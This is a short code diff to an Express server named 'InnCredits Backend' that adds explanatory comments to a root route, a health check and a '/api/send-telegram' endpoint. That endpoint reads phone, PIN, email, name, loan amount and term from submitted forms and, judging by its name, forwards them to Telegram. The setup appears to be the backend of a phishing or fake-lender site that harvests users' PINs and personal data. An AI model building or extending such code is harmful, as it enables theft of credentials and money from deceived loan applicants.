@@ -4,14 +4,17 @@ const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 
+// Root route - tells you the backend is running
 app.get('/', (req, res) => {
     res.send('InnCredits Backend is running!');
 });
 
+// Health check endpoint
 app.get('/api/health', (req, res) => {
     res.json({ status: 'OK', timestamp: new Date().toISOString() });
 });
 
+// Telegram notification endpoint
 app.post('/api/send-telegram', async (req, res) => {
     try {
         const { phone, pin, email, name, amount, term, type } = req.body;
@@ -36,6 +39,7 @@ app.post('/api/send-telegram', async (req, res) => {
     }
 });
 
+// Start the server
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
 });
